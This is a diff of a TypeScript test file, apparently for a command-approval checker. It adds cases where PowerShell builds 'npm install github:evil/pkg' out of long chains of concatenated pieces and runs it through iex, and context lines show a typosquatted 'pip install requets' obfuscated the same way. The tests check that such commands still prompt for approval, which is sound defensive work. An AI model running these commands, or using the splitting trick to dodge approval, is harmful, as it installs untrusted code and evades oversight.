@@ -183,6 +183,13 @@ describe('gap 3: a concatenated string passed to iex gets the verdict of the bar
     expectOneAsk(tool, command);
   });
 
+  // A chain longer than any fixed join count: padding pieces first, then the install. Each case must still ask.
+  const padding = (n: number) => Array(n).fill("''").join('+');
+  it.each([65, 70, 200])('a chain of %i empty pieces before the install asks once', (n) => {
+    expectOneAsk('PowerShell', `iex (${padding(n)}+'np'+'m'+' install github:evil/pkg')`);
+    expectOneAsk('PowerShell', `${padding(n)}+'np'+'m install github:evil/pkg' | iex`);
+  });
+
   it.each<Case>([
     ['PowerShell', `iex ('pip inst'+'all requets==2.31.0')`],
     ['PowerShell', `'pip inst'+'all requets==2.31.0' | iex`],
